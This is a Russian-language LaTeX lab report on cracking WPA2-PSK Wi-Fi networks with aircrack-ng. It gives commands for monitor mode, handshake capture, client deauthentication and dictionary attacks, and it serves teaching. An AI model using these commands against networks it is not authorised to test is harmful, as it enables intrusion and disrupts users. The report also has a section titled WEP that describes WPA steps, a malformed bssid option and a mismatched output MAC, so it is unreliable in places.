\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[russian]{babel}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\author{Рикардо санчес}
\date{}
\title{Отчет по лабораторной работе №3. Aircrack}
\begin{document}
\maketitle
\section{Цель работы}
Изучить возможности инструмента AirCrack и основы взлома WPA/WPA2, PSK и WEP.
\section{Ход работы}
\subsection{Взлом WPA2 PSK сети}
\subsubsection{Установка беспроводной сетевой карты в режим мониторинга}
Набираем под рутом\\
\verb+iwconfig+ - смотрим все беспроводные интерфейсы\\
\verb+airmon-ng start wlan0+ - ставим интерфейс в режим мониторинга.
\subsubsection{Поиск доступных беспроводных сетей}
\verb+airodump-ng mon0+ - просмотр всех каналов перечисляя точки доступа, находим доступные беспроводные сети.\\
Далее выбираем цель - точку с сильным сигналом и большим количеством трафика. Запишем ее канал и mac адрес.
\subsubsection{Сбор данных}
Пусть адаптер называется mon0 и, например, нужно захватить пакеты с 6 канала в файл под названием data. Для этого нужен airodump-ng.\\
\verb+airodump-ng -c 6 bssid 00:0F:CC:7D:5A:74 -w data mon0+\\
-c 6  - ловим пакеты с 6 канала\\
bssid 00:0F:CC:7D:5A:74 - mac адрес взламываемой точки доступа.\\
Выходным файлом должен быть cap-файл. А на вопрос "Only write WEP
IVs (y/n)" следует ответить нет.\\
Далее необходимо произвести захват входа клиента в сеть. Это необходимо для того, чтобы взломать WPA ключ.\\
\verb+aireplay-ng –deauth 3 -a MAC_IP -c MAC_Client mon0+ - генерирует дополнительный трафик к беспроводной сети, чтобы произвести атаку, для процедура переинициализации клиентов сети.\\

\subsubsection{Атака словарем}
Для начала нужен файл со словарем, его нужно поместить  в директорию с программой aircrack.\\
\verb+aircrack-ng -w wordlist capture_file+\\
wordlist - словарь, capture-file – cap-файл с данными.\\
Происходит перебор паролей. Если пароль не сложный, он сможе быстро подобраться.

Подбор длинного пароля происходит очень долго по времени.
\subsection{Взлом WEP сети}
\subsubsection{Запуск беспроводного интерфейса в режим мониторинга}
Режим мониторинга позволяет слушать все пакеты.
\verb+airmon-ng start wifi0 9+ - перекобчение беспроводной карты на канал 9  в режим мониторинга
\subsubsection{Сбор хендшейков}
Сбор рукопожатий.
\verb+airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0+\\
-c 9 - канал для беспроводной сети\\
--bssid 00:14:6C:7E:40:80 - mac адерс точки доступа\\
-w psk - префикс имени файла вывода\\
ath0 - имя интерфейса.\\
В предыдущем шаге мы увидели подключенного клиента. В другом сеансе консоли введем:\\
\verb+aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0+\\ и получим вывод:\\
\verb+Sending DeAuth to station -- STMAC: [00:0F:B5:34:30:30]+
\subsubsection{Взлом предварительного ключа}
Для этого откроем еще один сеанс консоли и введем туда:\\
\verb+aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap+\\
В файле password.lst хранится список пролей, в группе файлов *.cap содержатся перехваченные пакеты. 
 если хендшейк найден, то aircrack-ng пытается взломать предварительный ключ.
\end{document}
